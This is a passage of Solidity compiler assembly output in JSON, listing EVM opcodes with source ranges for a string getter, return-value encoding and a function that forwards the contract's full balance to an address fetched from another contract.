											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "23"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "EXP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "NOT",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "tag",
											"source": 3,
											"value": "23"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "RETURN",
											"source": 3
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "tag",
											"source": 3,
											"value": "9"
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "PUSH",
											"source": 3,
											"value": "3"
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "EXP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 16004,
											"end": 16011,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16033,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 16004,
											"end": 16033,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16033,
											"name": "PUSH",
											"source": 3,
											"value": "FEAE9AD3"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFF"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "E0"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SHL",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP7",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "EXTCODESIZE",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "25"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "25"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "GAS",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "STATICCALL",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "27"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "27"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "RETURNDATASIZE",
											"source": 3
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "28"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "28"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 16004,
											"end": 16035,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16045,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 15996,
											"end": 16045,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "PUSH",
											"source": 3,
											"value": "8FC"
										},
										{
											"begin": 16046,
											"end": 16067,
											"name": "SELFBALANCE",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "CALL",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "SWAP4",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "30"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "30"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 15996,
											"end": 16068,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "tag",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "31"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "31"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "tag",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 409,
